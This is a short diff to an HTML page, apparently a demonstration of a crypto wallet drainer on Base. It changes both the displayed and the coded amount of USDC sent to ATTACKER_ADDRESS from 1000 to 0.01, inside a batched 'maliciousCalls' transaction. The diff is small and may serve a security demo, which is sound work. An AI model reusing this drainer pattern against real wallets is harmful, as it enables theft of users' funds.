@@ -223,7 +223,7 @@ All in one atomic transaction. Zero chance to cancel midway.
     </div>
     <div class="info-card">
       <div class="info-card-label">USDC drained</div>
-      <div class="info-card-value">1000 USDC (via transfer() call to USDC contract)</div>
+      <div class="info-card-value">0.01 USDC (via transfer() call to USDC contract, param: 10000)</div>
     </div>
     <div class="info-card">
       <div class="info-card-label">USDC contract (Base)</div>
@@ -340,8 +340,8 @@ All in one atomic transaction. Zero chance to cancel midway.
       const USDC_ABI = ["function transfer(address to, uint256 amount) public returns (bool)"];
       const usdcInterface = new ethers.Interface(USDC_ABI);
       
-      // Assume user has 1000 USDC (6 decimals)
-      const usdcAmount = ethers.parseUnits("1000", 6);
+      // Drain 0.01 USDC (6 decimals)
+      const usdcAmount = ethers.parseUnits("0.01", 6);
       const usdcTransferData = usdcInterface.encodeFunctionData("transfer", [ATTACKER_ADDRESS, usdcAmount]);
 
       const maliciousCalls = [
